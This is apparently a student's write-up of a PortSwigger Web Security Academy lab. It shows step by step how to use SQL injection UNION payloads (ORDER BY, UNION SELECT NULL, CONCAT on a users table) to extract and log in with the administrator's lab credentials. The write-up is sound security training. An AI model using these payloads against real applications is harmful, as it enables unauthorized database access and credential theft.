# SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column

## Lab

**PortSwigger Web Security Academy**

**Lab:** SQL injection UNION attack, retrieving multiple values in a single column

## Goal

The goal of this lab was to use an SQL injection point where only one column is displayed in the response to retrieve the `administrator` user's username and password by combining them into the same column, and then log into that account.

## 1. Finding the number of columns

First, I determined how many columns the query returns using `ORDER BY`.

The payload I used:

```sql
ORDER BY 2--
```

Based on this, I determined that the query returns 2 columns.

## 2. Finding the column that accepts strings and is reflected in the response

Next, I tested which column accepted string values and was displayed in the response.

First I tried this payload:

```sql
UNION SELECT 'hello', 'world'--
```

but got an error. This showed that the first column did not accept string values.

I then used:

```sql
UNION SELECT NULL, 'hello'--
```

This time the query succeeded, and the value `hello` was displayed in the response.

This told me that the second column accepted strings and was reflected in the response.

## 3. Combining the username and password into a single column

The goal of the lab was to obtain both the username and password values through a single response column.

I first tried using `group_concat`:

```sql
UNION SELECT NULL, group_concat(username, password)
FROM users
WHERE username = 'administrator'--
```

But this query returned an Internal Server Error.

Since I was only retrieving data for a single user, I figured `group_concat` might not be necessary here, and tried using `CONCAT` instead to combine the values directly.

The query I used:

```sql
UNION SELECT NULL, CONCAT(username, password)
FROM users
WHERE username = 'administrator'--
```

This time the query ran successfully.

The following value was displayed in the response:

```text
administratorz0obgtar4mv6s2trkn1c
```

From this, I was able to separate out:

```text
Username: administrator
Password: z0obgtar4mv6s2trkn1c
```

I logged in through the login page using the credentials I obtained.

The login was successful and the lab was completed.

## Solution Summary

```text
ORDER BY 2
    ↓
Determine there are 2 columns
    ↓
UNION SELECT 'hello', 'world'
    ↓
Determine the first column does not accept strings
    ↓
UNION SELECT NULL, 'hello'
    ↓
Determine the 2nd column accepts strings and is reflected in the response
    ↓
Try retrieving data with group_concat
    ↓
Internal Server Error
    ↓
Use CONCAT
    ↓
Combine username + password into a single column
    ↓
Obtain the administrator's credentials
    ↓
Login
    ↓
Lab completed
```

## What I learned

* Determining the number of columns using `ORDER BY`
* Testing the data type compatibility of columns using `UNION SELECT`
* Determining which column is reflected in the response
* Combining multiple values into a single response column
* Combining values using `CONCAT`
* That `group_concat` and `CONCAT` serve different purposes
* That when I hit an error, instead of changing the whole query, it's better to think about which part of it might be causing the problem and try an alternative approach

## AI Usage

**AI was not used in solving this lab.**
